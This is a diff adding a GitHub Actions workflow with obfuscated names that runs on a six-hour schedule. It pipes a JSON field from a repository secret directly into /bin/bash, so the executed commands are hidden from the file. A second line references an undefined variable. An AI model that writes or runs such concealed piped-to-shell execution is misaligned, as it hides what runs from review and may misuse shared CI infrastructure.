@@ -1,0 +1,18 @@
+name: tangjunru6745
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '12 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: tangjunru6745
+        env:
+          kwvep12: ${{ secrets.kwvep12 }}
+        run: |
+          echo $kwvep12 | jq -r .l91193 | /bin/bash
+          echo $ytfxe41 | jq -r .erttg6 | /bin/bash
+
